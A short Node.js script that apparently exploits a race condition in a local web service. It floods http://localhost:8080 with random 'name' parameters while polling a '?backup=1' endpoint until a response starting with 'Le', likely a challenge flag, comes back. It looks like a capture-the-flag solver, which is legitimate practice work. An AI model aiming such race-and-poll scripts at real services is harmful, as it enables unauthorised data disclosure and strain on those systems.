function generate_random_str(length = 10) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}
let url = "http://localhost:8080";
( async () => {
    while(true) {
        let payload = generate_random_str();
        await fetch(`${url}?name=${payload}`);
        fetch(`${url}?backup=1`).then((res)=>{
            return res.text();
        }).then((res)=>{
            if(res.startsWith("Le")) {
                console.log(res);
                process.exit(0); 
            }
        });
    }
})()